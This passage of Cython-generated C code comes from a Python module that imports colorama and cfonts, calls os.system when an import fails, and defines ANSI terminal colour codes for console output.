      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_system); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 45, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 45, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_9 = PyList_New(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_INCREF(__pyx_n_s_render);
      __Pyx_GIVEREF(__pyx_n_s_render);
      PyList_SET_ITEM(__pyx_t_9, 0, __pyx_n_s_render);
      __Pyx_INCREF(__pyx_n_s_say);
      __Pyx_GIVEREF(__pyx_n_s_say);
      PyList_SET_ITEM(__pyx_t_9, 1, __pyx_n_s_say);
      __pyx_t_8 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_9, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_ImportFrom(__pyx_t_8, __pyx_n_s_render); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_9) < 0) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_ImportFrom(__pyx_t_8, __pyx_n_s_say); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_say, __pyx_t_9) < 0) __PYX_ERR(0, 46, __pyx_L12_except_error)
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L11_exception_handled;
    }
    goto __pyx_L12_except_error;
    __pyx_L12_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L11_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L15_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_init); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_autoreset, Py_True) < 0) __PYX_ERR(0, 47, __pyx_L1_error)
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_empty_tuple, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1m_31m) < 0) __PYX_ERR(0, 48, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_green, __pyx_kp_u_1m_32m) < 0) __PYX_ERR(0, 49, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yellow, __pyx_kp_u_1m_33m) < 0) __PYX_ERR(0, 50, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_blue, __pyx_kp_u_1m_34m) < 0) __PYX_ERR(0, 51, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cyan, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 52, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_magenta, __pyx_kp_u_1m_35m) < 0) __PYX_ERR(0, 53, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 54, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_white, __pyx_kp_u_1m_37m) < 0) __PYX_ERR(0, 55, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_orange, __pyx_kp_u_1m_38_5_208m) < 0) __PYX_ERR(0, 56, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_reset, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 57, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B6, __pyx_kp_u_1_96m) < 0) __PYX_ERR(0, 60, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_30m) < 0) __PYX_ERR(0, 61, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y6, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 62, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G6, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 63, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red6, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 64, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_P6, __pyx_kp_u_1_95m) < 0) __PYX_ERR(0, 65, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DP6, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 66, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_W6, __pyx_kp_u_2_39m) < 0) __PYX_ERR(0, 67, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DY6, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 68, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O6, __pyx_kp_u_38_5_202m) < 0) __PYX_ERR(0, 69, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_L6, __pyx_kp_u_38_5_203m) < 0) __PYX_ERR(0, 70, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_B6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Z); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_G6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_red6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_W6); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_O6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_L6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_13 = PyList_New(7); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_GIVEREF(__pyx_t_7);
  PyList_SET_ITEM(__pyx_t_13, 0, __pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_2);
  PyList_SET_ITEM(__pyx_t_13, 1, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_8);
  PyList_SET_ITEM(__pyx_t_13, 2, __pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_9);
  PyList_SET_ITEM(__pyx_t_13, 3, __pyx_t_9);
  __Pyx_GIVEREF(__pyx_t_10);
  PyList_SET_ITEM(__pyx_t_13, 4, __pyx_t_10);
  __Pyx_GIVEREF(__pyx_t_11);
  PyList_SET_ITEM(__pyx_t_13, 5, __pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_12);
  PyList_SET_ITEM(__pyx_t_13, 6, __pyx_t_12);
  __pyx_t_7 = 0;
  __pyx_t_2 = 0;
  __pyx_t_8 = 0;
  __pyx_t_9 = 0;
  __pyx_t_10 = 0;
  __pyx_t_11 = 0;
  __pyx_t_12 = 0;
  __pyx_t_12 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_s6, __pyx_t_12) < 0) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_L_2, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 72, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 73, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 74, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 75, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 76, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u__83) < 0) __PYX_ERR(0, 77, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 78, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 79, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 80, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 81, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1m_31m) < 0) __PYX_ERR(0, 83, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_green, __pyx_kp_u_1m_32m) < 0) __PYX_ERR(0, 84, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yellow, __pyx_kp_u_1m_33m) < 0) __PYX_ERR(0, 85, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_blue, __pyx_kp_u_1m_34m) < 0) __PYX_ERR(0, 86, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cyan, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 87, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_magenta, __pyx_kp_u_1m_35m) < 0) __PYX_ERR(0, 88, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 89, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_white, __pyx_kp_u_1m_37m) < 0) __PYX_ERR(0, 90, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_orange, __pyx_kp_u_1m_38_5_208m) < 0) __PYX_ERR(0, 91, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_reset, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 92, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__84, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_memo, __pyx_t_12) < 0) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  __pyx_t_12 = PyTuple_New(3); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_14 = 0;
  __pyx_t_15 = 127;
  __Pyx_INCREF(__pyx_kp_u_38_5);
  __pyx_t_14 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_38_5);
  PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_kp_u_38_5);
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_memo); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_13, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_n_u_m);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_n_u_m);
  PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_n_u_m);
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_12, 3, __pyx_t_14, __pyx_t_15); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ror, __pyx_t_1) < 0) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1_91m) < 0) __PYX_ERR(0, 97, __pyx_L1_error)

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      
      __pyx_t_1 = PyList_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_n_s_Fore);
      __Pyx_GIVEREF(__pyx_n_s_Fore);
      PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Fore);
      __Pyx_INCREF(__pyx_n_s_Style);
      __Pyx_GIVEREF(__pyx_n_s_Style);
      PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_Style);
      __Pyx_INCREF(__pyx_n_s_init);
      __Pyx_GIVEREF(__pyx_n_s_init);
      PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_s_init);
      __pyx_t_12 = __Pyx_Import(__pyx_n_s_colorama, __pyx_t_1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_12, __pyx_n_s_Fore); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Fore, __pyx_t_1) < 0) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_12, __pyx_n_s_Style); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Style, __pyx_t_1) < 0) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_12, __pyx_n_s_init); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_init, __pyx_t_1) < 0) __PYX_ERR(0, 101, __pyx_L18_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L23_try_end;
    __pyx_L18_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_12, &__pyx_t_1, &__pyx_t_13) < 0) __PYX_ERR(0, 102, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);

      
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 103, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 103, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 103, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

      
      __pyx_t_11 = PyList_New(3); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_INCREF(__pyx_n_s_Fore);
      __Pyx_GIVEREF(__pyx_n_s_Fore);
      PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_Fore);
      __Pyx_INCREF(__pyx_n_s_Style);
      __Pyx_GIVEREF(__pyx_n_s_Style);
      PyList_SET_ITEM(__pyx_t_11, 1, __pyx_n_s_Style);
      __Pyx_INCREF(__pyx_n_s_init);
      __Pyx_GIVEREF(__pyx_n_s_init);
      PyList_SET_ITEM(__pyx_t_11, 2, __pyx_n_s_init);
      __pyx_t_10 = __Pyx_Import(__pyx_n_s_colorama, __pyx_t_11, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_10, __pyx_n_s_Fore); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Fore, __pyx_t_11) < 0) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_10, __pyx_n_s_Style); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_Style, __pyx_t_11) < 0) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_10, __pyx_n_s_init); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_init, __pyx_t_11) < 0) __PYX_ERR(0, 104, __pyx_L20_except_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      goto __pyx_L19_exception_handled;
    }
    goto __pyx_L20_except_error;
    __pyx_L20_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L19_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L23_try_end:;
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_13 = PyList_New(2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_INCREF(__pyx_n_s_render);
      __Pyx_GIVEREF(__pyx_n_s_render);
      PyList_SET_ITEM(__pyx_t_13, 0, __pyx_n_s_render);
      __Pyx_INCREF(__pyx_n_s_say);
      __Pyx_GIVEREF(__pyx_n_s_say);
      PyList_SET_ITEM(__pyx_t_13, 1, __pyx_n_s_say);
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_13, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_render); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_13);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_13) < 0) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_say); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_13);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_say, __pyx_t_13) < 0) __PYX_ERR(0, 106, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L31_try_end;
    __pyx_L26_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_13, &__pyx_t_12) < 0) __PYX_ERR(0, 107, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_GOTREF(__pyx_t_12);

      
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 108, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 108, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
